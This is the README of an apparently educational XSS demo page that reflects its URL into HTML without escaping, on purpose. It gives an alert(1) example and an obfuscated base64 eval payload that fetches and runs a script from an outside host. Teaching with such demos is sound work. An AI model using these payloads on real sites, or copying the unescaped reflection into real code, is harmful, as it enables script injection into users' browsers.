# XSS-Demo

This is a simple page with some example content (borrowed from W3Schools), that has a deliberate Cross Site Scripting vulnerability. It reflects the URL down into HTML.

The barebones page can be seen using rawgit at: https://rawgit.com/sdclibbery/XSS-Demo/master/index.html

For example: https://rawgit.com/sdclibbery/XSS-Demo/master/index.html?%3Cscript%3Ealert(1)%3C/script%3E

Or more fun: https://rawgit.com/sdclibbery/XSS-Demo/master/index.html?%3Csvg/onload=eval(atob(%60JC5nZXRTY3JpcHQoJ2h0dHBzOi8vZGluaXNjcnV6LmdpdGh1Yi5pby9YU1MtUG9jcy9wb2NzL2RhbmNlLXhzcy5qcycp%60))%3E
(With thanks to Dinis Cruz http://blog.diniscruz.com/ for the payload :-)
